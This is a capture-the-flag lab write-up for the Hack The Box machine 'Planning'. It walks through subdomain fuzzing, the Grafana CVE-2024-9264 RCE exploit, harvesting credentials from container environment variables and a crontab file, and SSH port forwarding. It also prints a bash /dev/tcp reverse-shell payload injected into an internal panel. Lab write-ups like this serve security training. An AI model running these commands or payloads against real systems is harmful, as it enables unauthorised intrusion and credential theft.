
🧠 **Hack The Box – Planning (Easy)**
**Machine Info**

* Name: Planning
* Difficulty: Easy
* OS: Linux
* IP: 10.10.11.68
* Author: Vishnu S
* Completed on: July 6, 2025

---

## 🔍 Summary

The Planning machine involves virtual host enumeration, exploiting Grafana (CVE-2024-9264), Docker container escape, and privilege escalation through port forwarding and command injection in an internal panel.

---

## 🛠 Tools Used

* `nmap` – Port scanning
* `ffuf` – Subdomain enumeration
* `python3` – For exploit execution
* `netcat` – Reverse shell listener
* `ssh` – Remote login & port forwarding
* `linPEAS` – Privilege escalation enum

---

## 🧾 Walkthrough

### 1️⃣ Initial Enumeration

```bash
nmap 10.10.11.68
```

Ports found:

* 22 (SSH)
* 80 (HTTP)

---

### 2️⃣ Virtual Host Setup

Added to `/etc/hosts`:

```
10.10.11.68 planning.htb
```

Then accessed `http://planning.htb`

---

### 3️⃣ Subdomain Discovery

```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100
```

Found: `grafana.planning.htb`
Added to `/etc/hosts`

---

### 4️⃣ Grafana Exploitation (CVE-2024-9264)

Visited: `http://grafana.planning.htb`
Default credentials:

```
Username: admin
Password: 0D5oT70Fq13EvB5r
```

Used public exploit:
[https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

```bash
nc -lvnp 9001

python3 poc.py --url http://grafana.planning.htb \
--username admin \
--password 0D5oT70Fq13EvB5r \
--reverse-ip 10.10.14.96 \
--reverse-port 9001
```

✅ Reverse shell obtained.

---

### 5️⃣ Docker Escape

Inside the container:

```bash
env
```

Found:

```
Username: enzo
Password: RioTecRANDEntANT!
```

SSH into the host:

```bash
ssh enzo@10.10.11.68
```

Captured user flag:

```bash
cat /home/enzo/user.txt
```

---

### 6️⃣ Privilege Escalation

Uploaded and ran `linpeas.sh`
Found credentials in:

```bash
cat /opt/crontabs/crontab.db
```

```
Username: root
Password: P4ssw0rdS0pRi0T3c
```

Port 8000 exposed locally.

---

### 7️⃣ Port Forwarding

```bash
ssh -L 8000:localhost:8000 enzo@planning.htb
```

Visited `http://localhost:8000`
Logged in with `root` credentials.

Injected reverse shell payload:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.96/8888 <&1'
```

Set up listener:

```bash
nc -lvnp 8888
```

✅ Gained root shell.

---

## 🏁 Flags Captured

```bash
cat /home/enzo/user.txt
cat /root/root.txt
```

---

## ✅ Conclusion

The Planning box shows the danger of exposed services and credentials:

* Default credentials on Grafana
* Hardcoded env vars in Docker
* Command injection in internal apps
* Lack of proper service isolation

---

## 🔗 References

* [CVE-2024-9264](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9264)
* [Exploit Script](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
* [HackTricks](https://book.hacktricks.xyz/)
* [Medium Writeup](https://medium.com/@ypopova3/planning-hackthebox-fd3d5fcb8fc7)

---



